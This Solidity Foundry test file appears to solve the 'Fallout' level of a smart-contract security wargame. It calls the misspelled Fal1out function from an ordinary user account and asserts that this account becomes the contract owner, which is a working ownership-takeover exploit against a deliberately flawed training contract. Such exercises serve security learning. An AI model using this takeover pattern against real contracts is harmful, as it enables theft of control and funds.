// SPDX-License-Identifier: Unlicense
pragma solidity >=0.8.0;

import {DSTest} from "ds-test/test.sol";
import {Utilities} from "./utils/Utilities.sol";
import {console} from "./utils/Console.sol";
import {Vm} from "forge-std/Vm.sol";
import {Fallout} from "../Fallout.sol";

contract FalloutTest is DSTest {
    Vm internal immutable vm = Vm(HEVM_ADDRESS);
    Fallout internal falloutContract;

    Utilities internal utils;
    address payable[] internal users;
    address internal user;

    function setUp() public {
        utils = new Utilities();
        users = utils.createUsers(5);

        falloutContract = new Fallout();

        user = users[1];

        vm.deal(user, 5 ether);
    }

    function testFallback() public {
        // set user as message sender.
        vm.startPrank(user);

        falloutContract.Fal1out{value: 0.0001 ether}();

        assertEq(falloutContract.owner(), user);

        vm.stopPrank();
    }
}
